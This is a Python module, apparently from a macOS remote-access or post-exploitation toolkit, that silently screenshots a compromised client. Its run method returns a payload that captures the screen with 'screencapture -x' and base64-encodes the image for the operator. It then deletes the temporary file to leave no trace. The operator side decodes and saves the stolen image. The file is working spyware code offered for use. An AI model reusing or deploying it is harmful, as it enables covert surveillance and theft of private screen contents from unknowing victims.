from modules.helpers import ModuleABC
import uuid
import os
import base64


class Module(ModuleABC):
    def __init__(self):
        self.output_folder = None

    def get_info(self):
        return {
            "Author": ["Marten4n6"],
            "Description": "Takes a screenshot of the client's screen.",
            "References": [],
            "Task": False
        }

    def setup(self, module_input, view, successful):
        self.output_folder = os.path.expanduser(module_input.prompt("Output folder (ENTER for output/): "))

        if not self.output_folder:
            self.output_folder = "output"
            successful.put(True)
        elif not os.path.exists(self.output_folder):
            view.output("That folder doesn't exist!", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        import base64
        
        output_file = "/tmp/please_not_porn.png"
        
        run_command("screencapture -x %s" % output_file)
        print run_command("base64 %s" % output_file)
        run_command("rm -rf %s" % output_file)
        """

    def process_response(self, response: bytes, view):
        output_name = str(uuid.uuid4()).replace("-", "")[0:12] + ".png"
        output_file = os.path.join(self.output_folder, output_name)

        if not os.path.exists("output") and self.output_folder == "output":
            os.mkdir("output")

        with open(output_file, "wb") as open_file:
            open_file.write(base64.b64decode(response))

        view.output_separator()
        view.output("Screenshot saved to: {}".format(os.path.realpath(output_file)), "info")
